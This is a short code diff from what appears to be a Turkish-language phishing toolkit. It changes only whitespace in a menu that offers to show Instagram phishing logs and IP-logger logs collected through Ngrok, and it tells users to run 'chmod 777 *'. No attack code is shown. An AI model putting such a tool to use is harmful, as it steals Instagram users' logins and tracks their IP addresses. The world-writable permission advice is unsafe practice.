@@ -13,7 +13,7 @@ print('''Yaptığınız ve yapacağınız her şeyden siz sorumlusunuz.
         \//(____)
 ------\     (__)  2-) Instagram Oltalama Kayıtlarına Bak (index.php)
        `-----/		
-        		  3-) Ip Logger Kayıtlarına Bak (index2.php)
+        	  3-) Ip Logger Kayıtlarına Bak (index2.php)
 
 		Ngrok hata verirse veya permission denied hatası alırsanız
 			chmod 777 * 	yazın 
